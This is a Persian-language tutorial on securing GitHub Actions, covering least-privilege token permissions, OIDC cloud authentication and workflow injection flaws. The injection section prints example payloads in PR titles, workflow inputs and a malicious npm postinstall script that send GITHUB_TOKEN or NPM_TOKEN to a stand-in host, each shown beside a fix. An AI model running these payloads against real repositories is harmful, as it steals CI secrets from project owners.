# بخش ۱۲: امنیت GitHub Actions

**مدت یادگیری**: ۵ تا ۶ ساعت
**سطح سختی**: پیشرفته
**پیش‌نیاز**: بخش ۱۱ (cache، artifact، reusable، environment)

---

## فهرست محتوا

- [فصل ۵۲: `GITHUB_TOKEN` و `permissions` — کمترین دسترسی](#فصل-۵۲)
- [فصل ۵۳: OIDC و حذف secretهای ابری](#فصل-۵۳)
- [فصل ۵۴: تزریق در workflow — `pull_request_target` و ورودی مخرب](#فصل-۵۴)
- [فصل ۵۵: زنجیره‌ی تأمین — SHA pinning و allow-list](#فصل-۵۵)
- [فصل ۵۶: مدیریت secretها — دامنه، چرخش، پاکسازی](#فصل-۵۶)

---

## فصل ۵۲: `GITHUB_TOKEN` و `permissions` — کمترین دسترسی

### مقدمه

هر اجرای workflow یک توکن خودکار به نام `GITHUB_TOKEN` می‌گیرد که می‌تواند به API دسترسی داشته باشد. این توکن در پایان job منقضی می‌شود و به مخزن دیگری دسترسی ندارد — طراحی خوبی است. ولی اگر `permissions` را تنظیم نکنی، ممکن است دسترسی **بیش از حد** داشته باشد.

**چرا مهم است؟** اگر یک action آلوده اجرا شود و `GITHUB_TOKEN` دسترسی write داشته باشد، می‌تواند کد را تغییر دهد، release بسازد، یا حتی مخزن را حذف کند. با `permissions: read-all` یا کمتر، خسارت محدود می‌شود.

**کاربرد عملی:** یک خط در هر workflow، ریسک را چند برابر کاهش می‌دهد.

### مفاهیم اساسی

#### `GITHUB_TOKEN` چیست

| ویژگی | مقدار |
|---|---|
| ساخت | خودکار در شروع job |
| عمر | تا پایان job |
| دامنه | فقط همان مخزن |
| نوع | Installation token (مثل GitHub App) |
| نمایش در لاگ | ماسک می‌شود |
| دسترسی پیش‌فرض | بسته به تنظیمات مخزن/org |

#### `permissions` — جدول کامل

| Scope | مقادیر | چه می‌دهد |
|---|---|---|
| `actions` | read/write | مدیریت workflow runها |
| `attestations` | read/write | attestation |
| `checks` | read/write | check run |
| `contents` | read/write | کد، release، tag |
| `deployments` | read/write | deployment |
| `discussions` | read/write | Discussions |
| `id-token` | write | OIDC token |
| `issues` | read/write | Issue |
| `packages` | read/write | GitHub Packages |
| `pages` | read/write | Pages |
| `pull-requests` | read/write | PR |
| `repository-projects` | read/write | Projects |
| `security-events` | read/write | Code scanning، secret scanning |
| `statuses` | read/write | commit status |

#### سه سطح تنظیم

```
۱. Workflow (بالاترین اولویت)
   permissions: contents: read

۲. Job
   jobs:
     test:
       permissions: ...

۳. مخزن/سازمان (پیش‌فرض)
   Settings → Actions → General → Workflow permissions
```

**نکته:** `permissions` در سطح workflow/job، پیش‌فرض مخزن را override می‌کند (نه اضافه).

#### پیش‌فرض مخزن

```
Settings → Actions → General → Workflow permissions:
  ○ Read repository contents and packages permissions   ← توصیه‌شده
  ○ Read and write permissions                          ← قدیمی، خطرناک
```

**از ۲۰۲۳، پیش‌فرض جدید `read` است.** ولی مخزن‌های قدیمی ممکن است هنوز `write` باشند. چک کن.

### مثال‌های عملی

#### مثال ۱: تنظیم حداقلی

```yaml
name: CI

on: [push, pull_request]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

`contents: read` برای checkout کافی است. هیچ jobی نمی‌تواند کد را تغییر دهد.

#### مثال ۲: permissions در سطح job

```yaml
permissions:
  contents: read          # پیش‌فرض همه

jobs:
  test:
    runs-on: ubuntu-latest
    # از پیش‌فرض workflow استفاده می‌کند

  comment:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write    # فقط این job
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            await github.rest.issues.createComment({
              ...context.repo,
              issue_number: context.issue.number,
              body: "CI تمام شد",
            });
```

**اصل:** `write` را فقط در jobی بده که واقعاً لازم دارد.

#### مثال ۳: `permissions: {}` — هیچ دسترسی

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    permissions: {}
    steps:
      - run: echo "بدون هیچ دسترسی به API"
```

برای jobهایی که فقط محاسبه می‌کنند.

#### مثال ۴: release با حداقل دسترسی

```yaml
jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write      # برای ساخت release و tag
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: softprops/action-gh-release@v2
        with:
          files: dist/*
```

#### مثال ۵: آپلود SARIF برای code scanning

```yaml
jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write     # برای آپلود نتایج
      actions: read              # برای خواندن workflow run
    steps:
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: results.sarif
```

#### مثال ۶: `permissions: read-all` و `write-all`

```yaml
permissions: read-all       # همه read
permissions: write-all      # همه write ← خطرناک، استفاده نکن
```

`read-all` برای دیباگ خوب است؛ `write-all` هرگز.

#### مثال ۷: بررسی تنظیمات فعلی

```bash
gh api repos/OWNER/REPO/actions/permissions/workflow
# {"default_workflow_permissions":"read","can_approve_pull_request_reviews":false}

# تغییر به read
gh api -X PUT repos/OWNER/REPO/actions/permissions/workflow \
  -f default_workflow_permissions=read \
  -F can_approve_pull_request_reviews=false
```

**`can_approve_pull_request_reviews`** را هم `false` بگذار — وگرنه `GITHUB_TOKEN` می‌تواند PR را approve کند (که ruleset را دور می‌زند).

#### مثال ۸: لیست همه‌ی workflowها و permissionsشان

```bash
# با actionlint (هشدار می‌دهد اگر permissions نباشد)
actionlint -shellcheck= .github/workflows/*.yml

# یا با grep
grep -L "^permissions:" .github/workflows/*.yml
```

هر فایلی که `permissions` ندارد، مشکوک است.

### مقایسه و الگوهای مختلف

#### `GITHUB_TOKEN` در برابر PAT

| | `GITHUB_TOKEN` | PAT |
|---|---|---|
| ساخت | خودکار | دستی |
| عمر | job | ماه‌ها |
| دامنه | یک مخزن | چند مخزن |
| اگر لو برود | بی‌اثر (منقضی) | فاجعه |
| trigger workflow جدید | ❌ | ✅ |
| توصیه | ✅ پیش‌فرض | فقط اگر لازم |

**نکته‌ی مهم:** کارهایی که با `GITHUB_TOKEN` انجام می‌شوند، workflow جدید trigger **نمی‌کنند**. این یک محافظت داخلی در برابر حلقه است. اگر به trigger نیاز داری (مثلاً release که deploy را trigger کند)، باید از GitHub App یا PAT استفاده کنی — با احتیاط.

#### `read` در برابر `write` برای `contents`

| | `read` | `write` |
|---|---|---|
| checkout | ✅ | ✅ |
| push | ❌ | ✅ |
| ساخت release | ❌ | ✅ |
| تغییر کد توسط action آلوده | ❌ | ✅ |
| توصیه | ✅ پیش‌فرض | فقط برای release/deploy |

#### پیش‌فرض مخزن در برابر workflow

| | مخزن | workflow |
|---|---|---|
| اعمال | همه‌ی workflowهای بدون `permissions` | همان workflow |
| توصیه | `read` | صریح در هر فایل |

**بهترین:** هر دو. مخزن `read` (تور نجات) + هر workflow صریح (دقت).

### اشکال شایع

#### ۱. `permissions` ننوشتن

اگر مخزن روی `write` باشد (مخزن قدیمی)، هر action دسترسی write دارد. **همیشه صریح بنویس.**

#### ۲. `write-all` برای راحتی

```yaml
✗ permissions: write-all
```

یک action آلوده می‌تواند کد را تغییر دهد. هرگز.

#### ۳. `can_approve_pull_request_reviews: true`

`GITHUB_TOKEN` می‌تواند PR را approve کند — که review اجباری ruleset را دور می‌زند. `false` بگذار.

#### ۴. PAT به‌جای `GITHUB_TOKEN` برای راحتی

PAT ماه‌ها زنده است، در secret ذخیره می‌شود، و اگر لو برود همه‌چیز می‌رود. فقط وقتی از PAT استفاده کن که `GITHUB_TOKEN` جواب نمی‌دهد (trigger workflow، دسترسی به مخزن دیگر).

#### ۵. `contents: write` در workflow تست

job تست به `write` نیازی ندارد. اگر action آلوده باشد، می‌تواند کد را تغییر دهد.

#### ۶. فراموش کردن `id-token: write` برای OIDC

```
Error: Not authorized to perform sts:AssumeRoleWithWebIdentity
```

`permissions: id-token: write` لازم است (فصل ۵۳).

#### ۷. `GITHUB_TOKEN` در fork

در PR از fork، `GITHUB_TOKEN` فقط `read` است — طراحی امنیتی. اگر workflow به `write` نیاز دارد، در fork کار نمی‌کند.

### نکات مهم (Tips & Tricks)

- **`permissions: contents: read`** در همه‌ی workflowها — یک خط، ریسک کم.
- **`write` در سطح job**، نه workflow.
- **`can_approve_pull_request_reviews: false`** — جلوگیری از دور زدن review.
- **`grep -L "^permissions:"`** برای پیدا کردن workflowهای بدون permissions.
- **`GITHUB_TOKEN` را در لاگ چاپ نکن** — ماسک می‌شود، ولی در artifact ممکن است لو برود.
- **برای trigger workflow دیگر، از GitHub App استفاده کن**، نه PAT.

### خلاصه فصل

- `GITHUB_TOKEN` خودکار، کوتاه‌عمر، محدود به یک مخزن.
- **`permissions` را صریح بنویس** — پیش‌فرض ممکن است بیش از حد باشد.
- `write` فقط در jobی که لازم دارد.
- `can_approve_pull_request_reviews: false`.
- `GITHUB_TOKEN` workflow جدید trigger نمی‌کند.
- `contents: read` برای ۹۰٪ jobها کافی است.

**سؤالات مروری:**
1. چرا `permissions` صریح مهم است؟
2. چرا `can_approve_pull_request_reviews` باید `false` باشد؟
3. چرا `GITHUB_TOKEN` workflow جدید trigger نمی‌کند و چه زمانی این مشکل است؟

---

## فصل ۵۳: OIDC و حذف secretهای ابری

### مقدمه

روش سنتی اتصال به AWS/GCP/Azure این است: یک access key بساز، در GitHub secret بگذار، و برای همیشه نگران باش که لو برود. OIDC این را کاملاً حذف می‌کند: **هیچ کلید ذخیره‌شده‌ای وجود ندارد.**

**چرا مهم است؟** کلیدهای ابری لو رفته یکی از رایج‌ترین علل نشت داده است. با OIDC، هر اجرا یک توکن کوتاه‌عمر (۱۵ دقیقه) می‌گیرد که فقط از یک workflow مشخص و یک branch مشخص قابل دریافت است.

**کاربرد عملی:** اگر به AWS/GCP/Azure deploy می‌کنی، این فصل باید در اولویت باشد.

### مفاهیم اساسی

#### مشکل کلید ثابت

```
❌ روش قدیمی:
GitHub Secret: AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG..."
  ↓
هر workflow آن را می‌خواند
  ↓
اگر لو برود → دسترسی دائمی به حساب ابری
  ↓
چرخش دستی، دردناک
```

#### OIDC چطور کار می‌کند

```
✅ روش OIDC:
۱. workflow درخواست یک OIDC token می‌کند (permissions: id-token: write)
۲. GitHub یک JWT امضا‌شده صادر می‌کند با claimها:
   - repo: myorg/backend
   - ref: refs/heads/main
   - workflow: deploy.yml
   - environment: production
۳. workflow توکن را به AWS STS می‌دهد
۴. AWS امضا را با کلید عمومی GitHub بررسی می‌کند
۵. اگر claimها با trust policy بخواند → توکن موقت (۱۵ دقیقه) می‌دهد
۶. workflow از آن برای دسترسی استفاده می‌کند
```

**هیچ کلید ثابتی وجود ندارد.** اگر کسی workflow را تغییر دهد تا از branch دیگری اجرا شود، AWS توکن نمی‌دهد.

#### claimهای مهم

| Claim | نمونه | برای چه |
|---|---|---|
| `sub` | `repo:myorg/backend:ref:refs/heads/main` | محدود کردن به repo + branch |
| `repository` | `myorg/backend` | مخزن |
| `ref` | `refs/heads/main` | branch/tag |
| `environment` | `production` | environment |
| `workflow` | `deploy.yml` | فایل workflow |
| `job_workflow_ref` | `myorg/.github/.github/workflows/deploy.yml@v1` | reusable workflow |
| `event_name` | `push` | رویداد |
| `actor` | `ali` | کاربر |

### مثال‌های عملی

#### مثال ۱: OIDC با AWS

**مرحله ۱ — در AWS، provider بساز:**

```bash
# با AWS CLI
aws iam create-open-id-connect-provider \
  --url https://token.actions.githubusercontent.com \
  --client-id-list sts.amazonaws.com \
  --thumbprint-list 6938fd4d98bab03faadb97b34396831e3780aea1
```

**مرحله ۲ — نقش با trust policy:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:myorg/backend:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

**مرحله ۳ — workflow:**

```yaml
name: Deploy

on:
  push:
    branches: [main]

permissions:
  id-token: write        # ← حیاتی
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubDeploy
          aws-region: eu-central-1
          # هیچ access key لازم نیست!

      - run: aws s3 sync dist/ s3://my-bucket/
```

**توجه:** `aws-actions/configure-aws-credentials@v4` را با SHA pin کن (فصل ۵۵).

#### مثال ۲: OIDC با GCP

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: projects/123/locations/global/workloadIdentityPools/github/providers/my-repo
          service_account: deploy@my-project.iam.gserviceaccount.com

      - uses: google-github-actions/setup-gcloud@v2

      - run: gcloud app deploy
```

#### مثال ۳: OIDC با Azure

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: azure/login@v2
        with:
          client-id: ${{ vars.AZURE_CLIENT_ID }}
          tenant-id: ${{ vars.AZURE_TENANT_ID }}
          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
          # بدون client-secret!

      - run: az webapp deploy --name myapp --src-path dist.zip
```

#### مثال ۴: محدود کردن به environment

اگر deploy از environment `production` انجام می‌شود، `sub` می‌شود:

```
repo:myorg/backend:environment:production
```

trust policy:

```json
"StringEquals": {
  "token.actions.githubusercontent.com:sub": "repo:myorg/backend:environment:production"
}
```

حالا حتی اگر کسی workflow را روی branch دیگری اجرا کند، بدون تأیید environment توکن نمی‌گیرد. **این امن‌ترین حالت است.**

#### مثال ۵: محدود کردن به reusable workflow

```
repo:myorg/backend:job_workflow_ref:myorg/.github/.github/workflows/deploy.yml@refs/tags/v1
```

یعنی فقط اگر deploy از این reusable workflow مشخص اجرا شود.

#### مثال ۶: بررسی claimها (دیباگ)

```yaml
- name: نمایش OIDC token claims
  run: |
    TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
    echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq
```

**هشدار:** این token را در لاگ چاپ نکن (فقط claimها را).

#### مثال ۷: policy با `StringLike` برای branchهای متعدد

```json
"StringLike": {
  "token.actions.githubusercontent.com:sub": "repo:myorg/backend:ref:refs/heads/release/*"
}
```

#### مثال ۸: بررسی اینکه OIDC کار می‌کند

```yaml
- run: |
    if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
      echo "::error::OIDC در دسترس نیست. permissions: id-token: write را چک کن"
      exit 1
    fi
```

### مقایسه و الگوهای مختلف

#### OIDC در برابر کلید ثابت

| | OIDC | کلید ثابت |
|---|---|---|
| ذخیره‌ی secret | ❌ | ✅ |
| عمر | ۱۵ دقیقه | ماه‌ها |
| محدود به branch | ✅ | ❌ |
| چرخش | خودکار | دستی |
| اگر لو برود | بی‌اثر | فاجعه |
| پیچیدگی setup | متوسط | کم |

#### claim: `ref` در برابر `environment` در برابر `job_workflow_ref`

| claim | امنیت | انعطاف |
|---|---|---|
| `ref:refs/heads/main` | خوب | متوسط |
| `environment:production` | ✅ بهترین | کم (نیاز به approval) |
| `job_workflow_ref` | ✅ عالی | خیلی کم |
| `repo:...:*` (wildcard) | ❌ ضعیف | زیاد |

**توصیه:** `environment` برای production، `ref` برای staging.

#### سه ابر در یک نگاه

| | AWS | GCP | Azure |
|---|---|---|---|
| Action | `configure-aws-credentials` | `google-github-actions/auth` | `azure/login` |
| provider | OIDC provider | Workload Identity Pool | Federated credential |
| claim اصلی | `sub` | `attribute.repository` | `sub` |
| پیچیدگی | متوسط | بالا | متوسط |

### اشکال شایع

#### ۱. `permissions: id-token: write` فراموش شد

```
Error: Credentials could not be loaded
```

`id-token: write` در سطح job یا workflow لازم است.

#### ۲. `sub` خیلی وسیع

```json
✗ "StringLike": { "...:sub": "repo:myorg/backend:*" }
```

هر branch، هر PR، هر event می‌تواند توکن بگیرد. مهاجم می‌تواند PR بزند و deploy کند.

#### ۳. audience اشتباه

```
Error: Invalid identity token: audience mismatch
```

`aud` باید با آنچه provider انتظار دارد بخواند (`sts.amazonaws.com` برای AWS).

#### ۴. thumbprint قدیمی

برای AWS، thumbprint باید به‌روز باشد. اگر خطای certificate داد، thumbprint جدید را از مستندات بگیر.

#### ۵. OIDC و fork

PR از fork، `id-token: write` ندارد. طراحی امنیتی. برای preview deploy از fork، باید روش دیگری پیدا کنی.

#### ۶. `configure-aws-credentials` بدون SHA

```yaml
✗ uses: aws-actions/configure-aws-credentials@v4
✓ uses: aws-actions/configure-aws-credentials@8c11bf7acf8f0f7e5f2d0e0c0b0a0f0e0d0c0b0a # v4.x.x
```

tag قابل تغییر است؛ SHA نه. فصل ۵۵.

#### ۷. فراموش کردن حذف کلید قدیمی

بعد از مهاجرت به OIDC، access key قدیمی را در AWS **حذف کن**. وگرنه ریسک باقی است.

### نکات مهم (Tips & Tricks)

- **`environment` claim** امن‌ترین محدودیت است — با approval ترکیب کن.
- **کلید قدیمی را حذف کن** بعد از مهاجرت.
- **`ACTIONS_ID_TOKEN_REQUEST_URL`** را چک کن که وجود دارد.
- **SHA pin برای actionهای ابری** — اینها دسترسی بالا دارند.
- **در trust policy، `StringEquals` به‌جای `StringLike`** وقتی ممکن است.
- **OIDC برای همه‌ی ابرها کار می‌کند** — AWS، GCP، Azure، Vault، Cloudflare.

### خلاصه فصل

- OIDC کلید ثابت را حذف می‌کند: توکن ۱۵ دقیقه‌ای با claimهای محدود.
- نیاز به `permissions: id-token: write`.
- **`sub` claim** تعیین می‌کند چه کسی توکن بگیرد — محدودش کن.
- `environment` claim امن‌ترین محدودیت است.
- کلید قدیمی را بعد از مهاجرت حذف کن.
- actionهای ابری را با SHA pin کن.

**سؤالات مروری:**
1. چرا OIDC امن‌تر از کلید ثابت است؟
2. کدام claim امن‌ترین محدودیت را می‌دهد؟
3. چرا `sub` با wildcard خطرناک است؟

---

## فصل ۵۴: تزریق در workflow — `pull_request_target` و ورودی مخرب

### مقدمه

این فصل درباره‌ی **آسیب‌پذیری‌های GitHub Actions** است — نه برای حمله، بلکه برای اینکه کدت را از آنها محافظت کنی. چند الگوی خطرناک وجود دارد که بارها منجر به نشت secret در پروژه‌های واقعی شده‌اند.

**چرا مهم است؟** GitHub Actions یک محیط اجرای کد است که به secrets دسترسی دارد. اگر ورودی مهاجم به shell برسد، secretها لو می‌روند. این اتفاق در پروژه‌های بزرگ (از جمله برخی پروژه‌های متن‌باز معروف) افتاده است.

**مرز قانونی:** تمام مثال‌های این فصل برای **دفاع** است. تست این حملات روی مخزنی که مالکش نیستی، نقض قوانین و شرایط استفاده‌ی GitHub است.

**کاربرد عملی:** بعد از این فصل می‌توانی workflow خودت را audit کنی و الگوهای خطرناک را پیدا کنی.

### مفاهیم اساسی

#### سه کلاس آسیب‌پذیری

| کلاس | علت | نتیجه |
|---|---|---|
| **Script injection** | ورودی مهاجم در `run:` | اجرای کد دلخواه |
| **`pull_request_target` misuse** | checkout کد PR با دسترسی secrets | نشت secret |
| **Action آلوده** | action شخص ثالث مخرب | دسترسی کامل |

#### Script injection — الگوی خطرناک

```yaml
✗ - run: echo "${{ github.event.pull_request.title }}"
```

اگر عنوان PR این باشد:

```
"; curl https://evil.example/steal?t=$SECRET; echo "
```

shell آن را اجرا می‌کند.

**چرا؟** `${{ }}` قبل از اجرای shell **متن‌بندی** می‌شود. یعنی محتوای عنوان PR مستقیم داخل دستور shell قرار می‌گیرد.

#### ورودی‌های خطرناک

| فیلد | قابل کنترل توسط |
|---|---|
| `github.event.pull_request.title` | هر کسی که PR بزند |
| `github.event.pull_request.body` | همان |
| `github.event.issue.title` | هر کسی که Issue بزند |
| `github.event.issue.body` | همان |
| `github.event.comment.body` | هر کسی که کامنت بگذارد |
| `github.event.pull_request.head.ref` | نویسنده‌ی PR (نام branch) |
| `github.head_ref` | همان |
| `github.event.release.name` | کسی که release می‌سازد |
| `github.event.pages.*.page_name` | محتوای wiki |
| `github.event.commits.*.message` | نویسنده‌ی commit |

#### `pull_request_target` — چرا خطرناک

| | `pull_request` | `pull_request_target` |
|---|---|---|
| workflow از | branch PR (fork) | branch base (main) |
| کد checkout شده | کد PR | کد base |
| دسترسی secrets | ❌ | ✅ |
| `GITHUB_TOKEN` | read | write (اگر تنظیم شده) |

`pull_request_target` برای کارهایی طراحی شد که به secrets نیاز دارند و **نباید** کد PR را اجرا کنند — مثل برچسب زدن یا کامنت.

اگر کد PR را checkout کنی و اجرا کنی، مهاجم کدش را با دسترسی secrets اجرا می‌کند.

### مثال‌های عملی

#### مثال ۱: script injection — آسیب‌پذیر

```yaml
name: خوش‌آمد
on:
  pull_request_target:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: echo "ممنون @${{ github.event.pull_request.user.login }} برای PR: ${{ github.event.pull_request.title }}"
```

مهاجم PRی با عنوان زیر می‌زند:

```
$(curl -s https://evil.example/x?d=$(base64 -w0 <<< "$GITHUB_TOKEN"))
```

نتیجه: توکن به سرور مهاجم می‌رود.

#### مثال ۲: نسخه‌ی امن — متغیر محیطی

```yaml
- name: خوش‌آمد
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    PR_AUTHOR: ${{ github.event.pull_request.user.login }}
  run: |
    echo "ممنون @$PR_AUTHOR برای PR: $PR_TITLE"
```

**چرا امن است؟** `${{ }}` در `env:` ارزیابی می‌شود و مقدار در متغیر محیطی می‌نشیند. shell آن را به‌عنوان **داده** می‌بیند، نه کد.

**قاعده:** هرگز `${{ }}` را مستقیم در `run:` نگذار اگر مقدار از ورودی کاربر می‌آید.

#### مثال ۳: نسخه‌ی امن — `actions/github-script`

```yaml
- uses: actions/github-script@v7
  with:
    script: |
      const title = context.payload.pull_request.title;   // داده، نه کد
      await github.rest.issues.createComment({
        ...context.repo,
        issue_number: context.payload.pull_request.number,
        body: `ممنون برای PR: ${title}`,
      });
```

JavaScript مقادیر را escape می‌کند. امن است.

#### مثال ۴: `pull_request_target` — آسیب‌پذیر

```yaml
✗ on:
    pull_request_target:
      types: [opened, synchronize]

  jobs:
    test:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}   # ← کد PR!
        - run: npm ci                                         # ← اجرا با secrets
        - run: npm test
          env:
            NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

مهاجم در `package.json` یک `postinstall` مخرب می‌گذارد:

```json
"scripts": {
  "postinstall": "curl -s https://evil.example/x?t=$NPM_TOKEN"
}
```

`npm ci` آن را اجرا می‌کند و توکن می‌رود.

#### مثال ۵: نسخه‌ی امن — `pull_request` + تأیید

```yaml
✓ on:
    pull_request:

  jobs:
    test:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v4
        - run: npm ci
        - run: npm test
```

بدون secrets. اگر تست به secret نیاز دارد، از fork اجرا نمی‌شود (که درست است).

#### مثال ۶: اگر واقعاً به `pull_request_target` نیاز داری

الگوی امن: workflow در `pull_request_target` اجرا شود ولی **کد PR را اجرا نکن**؛ فقط از API استفاده کن:

```yaml
on:
  pull_request_target:
    types: [opened]

permissions:
  pull-requests: write
  contents: read

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            // فقط API، بدون checkout
            const body = context.payload.pull_request.body || "";
            if (/\[x\] مستندات/.test(body)) {
              await github.rest.issues.addLabels({
                ...context.repo,
                issue_number: context.payload.pull_request.number,
                labels: ["documentation"],
              });
            }
```

**الگوی دو-مرحله‌ای** (اگر باید کد PR را پردازش کنی):

```yaml
# مرحله ۱: بدون secrets، کد PR را اجرا کن، artifact بساز
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with: { name: dist, path: dist/ }

# مرحله ۲: با secrets، فقط artifact را پردازش کن (نه کد PR)
on:
  workflow_run:
    workflows: [build]
    types: [completed]
jobs:
  deploy:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: dist
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
```

**توجه:** حتی artifact هم می‌تواند مخرب باشد (اگر مهاجم فایل مخرب بسازد). برای امنیت کامل، artifact را اعتبارسنجی کن.

#### مثال ۷: ورودی `workflow_dispatch` — خطر

```yaml
✗ on:
    workflow_dispatch:
      inputs:
        branch:
          description: "branch"
  jobs:
    deploy:
      steps:
        - run: git checkout ${{ inputs.branch }}
```

اگر کسی با دسترسی Actions این را اجرا کند و `branch` را `main; curl evil` بگذارد... اما فقط کسانی که دسترسی write دارند می‌توانند `workflow_dispatch` را trigger کنند. ریسک کمتر، ولی هنوز باید escape کنی:

```yaml
✓ - name: checkout
    env:
      BRANCH: ${{ inputs.branch }}
    run: git checkout "$BRANCH"
```

#### مثال ۸: نام branch — ورودی مخفی

`github.head_ref` (نام branch در PR) هم قابل کنترل است. نام branch می‌تواند شامل کاراکترهای عجیب باشد:

```yaml
✗ - run: echo "شاخه: ${{ github.head_ref }}"
✓ - run: echo "شاخه: $GITHUB_HEAD_REF"
```

`GITHUB_HEAD_REF` یک متغیر محیطی است که GitHub خودش تنظیم می‌کند — امن.

#### مثال ۹: audit workflow خودت

```bash
# پیدا کردن ${{ }} داخل run:
grep -rn 'run:.*\${{\s*github\.event' .github/workflows/

# پیدا کردن pull_request_target
grep -rn "pull_request_target" .github/workflows/

# پیدا کردن checkout با head.sha
grep -rn "head.sha\|head.ref" .github/workflows/
```

**هر نتیجه را بررسی کن.**

#### مثال ۱۰: ابزار خودکار

**`zizmor`** — یک linter امنیتی برای GitHub Actions:

```bash
pipx install zizmor
zizmor .github/workflows/
# یا
zizmor --pedantic .github/workflows/
```

پیدا می‌کند: template injection، `pull_request_target` خطرناک، actionهای unpinned، permissions بیش از حد.

**`actionlint`** هم بعضی موارد را می‌گیرد.

### مقایسه و الگوهای مختلف

#### روش‌های پاس دادن ورودی

| روش | امنیت | توضیح |
|---|---|---|
| `${{ }}` در `run:` | ❌ | تزریق ممکن |
| `env:` + `$VAR` | ✅ | داده، نه کد |
| `actions/github-script` | ✅ | escape می‌شود |
| فایل موقت | ✅ | `echo "$X" > f && cmd f` |

#### `pull_request` در برابر `pull_request_target`

| | `pull_request` | `pull_request_target` |
|---|---|---|
| کد PR اجرا می‌شود | ✅ (بدون secrets) | ❌ (اگر درست بنویسی) |
| secrets | ❌ | ✅ |
| امن | ✅ | ⚠️ نیاز به دقت |
| توصیه | ✅ پیش‌فرض | فقط برای API |

#### الگوی دو-مرحله‌ای در برابر `pull_request_target` مستقیم

| | دو-مرحله‌ای | مستقیم |
|---|---|---|
| پیچیدگی | بالا | کم |
| امنیت | ✅ | ❌ |
| نیاز به `workflow_run` | ✅ | ❌ |

### اشکال شایع

#### ۱. `${{ github.event.* }}` در `run:`

شایع‌ترین آسیب‌پذیری. همیشه `env:` استفاده کن.

#### ۲. `pull_request_target` + checkout کد PR

دومین شایع‌ترین. هرگز.

#### ۳. `actions/checkout` بدون `persist-credentials: false`

```yaml
✗ - uses: actions/checkout@v4
```

به‌طور پیش‌فرض، توکن در `.git/config` ذخیره می‌شود. اگر کد بعدی مخرب باشد، می‌تواند آن را بخواند.

```yaml
✓ - uses: actions/checkout@v4
    with:
      persist-credentials: false
```

برای jobهایی که بعد از checkout کد غیرقابل‌اعتماد اجرا می‌کنند، حیاتی است.

#### ۴. `npm install` بدون `--ignore-scripts`

`postinstall` اسکریپت اجرا می‌کند. برای dependencyهای غیرقابل‌اعتماد:

```yaml
- run: npm ci --ignore-scripts
```

#### ۵. `git clone` از URL کاربر

```yaml
✗ - run: git clone ${{ inputs.repo_url }}
```

مهاجم می‌تواند URL مخرب بدهد (مثلاً `--upload-pack=...`). همیشه اعتبارسنجی کن.

#### ۶. چاپ secret در لاگ

```yaml
✗ - run: echo "توکن: ${{ secrets.TOKEN }}"
```

GitHub ماسک می‌کند، ولی اگر base64 یا تغییر شکل بدهی، ماسک کار نمی‌کند:

```yaml
✗ - run: echo "${{ secrets.TOKEN }}" | base64
```

#### ۷. artifact مخرب

اگر job اول از PR artifact می‌سازد و job دوم (با secrets) آن را اجرا می‌کند، مهاجم می‌تواند فایل مخرب بگذارد. artifact را اعتبارسنجی کن یا فقط داده (نه کد اجرایی) انتقال بده.

#### ۸. `workflow_run` بدون بررسی

```yaml
✗ on: workflow_run
   # هر workflowی را trigger می‌کند
✓ on:
    workflow_run:
      workflows: [CI]        # فقط این یکی
      types: [completed]
```

### نکات مهم (Tips & Tricks)

- **`env:` برای هر ورودی کاربر** — قاعده‌ی طلایی.
- **`persist-credentials: false`** در checkout کد غیرقابل‌اعتماد.
- **`zizmor`** را در CI بگذار.
- **`pull_request_target` را ممنوع کن** مگر با دلیل مستند.
- **`npm ci --ignore-scripts`** برای dependency غیرقابل‌اعتماد.
- **الگوی دو-مرحله‌ای** برای پردازش کد PR با secrets.
- **`grep` برای `${{ github.event` در `run:`** — audit سریع.

### خلاصه فصل

- **Script injection:** `${{ }}` در `run:` با ورودی کاربر = اجرای کد. راه‌حل: `env:`.
